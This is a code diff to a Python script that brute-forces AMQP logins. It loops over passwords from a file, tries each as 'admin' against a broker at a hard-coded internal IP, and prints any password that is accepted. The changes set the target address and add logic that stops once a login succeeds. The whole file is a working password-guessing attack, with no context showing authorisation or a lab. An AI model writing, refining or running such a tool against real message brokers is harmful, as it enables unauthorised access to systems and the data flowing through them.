@@ -1,6 +1,6 @@
 from __future__ import print_function
 import sys
-import time
+import time 
 
 from proton import Message
 from proton.handlers import MessagingHandler
@@ -14,6 +14,7 @@ class SendHandler(MessagingHandler):
         self.message_body = message_body
         self.password = password
         self.sent = False
+        self.success = False  
 
     def on_start(self, event):
         conn = event.container.connect(self.url)
@@ -27,11 +28,13 @@ class SendHandler(MessagingHandler):
             print("Message sent!")
             print(f"Password - {self.password}")
             self.sent = True
+            self.success = True 
             event.sender.close()
             event.connection.close()
 
     def on_accepted(self, event):
         print("Message accepted by server - access OK!")
+        self.success = True 
 
     def on_disconnected(self, event):
         print("Disconnected")
@@ -39,7 +42,7 @@ class SendHandler(MessagingHandler):
     def on_rejected(self, event):
         print("Message rejected:", event.delivery.remote.condition)
 
-
+# Load passwords from pass.txt
 try:
     with open('pass.txt', 'r') as f:
         passwords = [line.strip() for line in f if line.strip()]
@@ -47,18 +50,27 @@ except FileNotFoundError:
     print("File pass.txt not found!")
     sys.exit(1)
 
-login = "admin" 
-ip = ""
+login = "admin"  
+ip = "10.50.229.215"
 port = "61617"
 address = "testQueue"
 message_body = "test"
 
+success_found = False  
+
 for password in passwords:
+    if success_found:
+        break 
+
     url = f"amqp://{login}:{password}@{ip}:{port}"
     print(f"Trying password: {password}")
     try:
-        Container(SendHandler(url, address, message_body, password)).run()
+        handler = SendHandler(url, address, message_body, password)
+        Container(handler).run()
+        if handler.success:
+            print("Success! Stopping brute-force.")
+            success_found = True
     except Exception as e:
         print("Failed:", e)
-    time.sleep(1) 
+    time.sleep(1)
     print("\n")
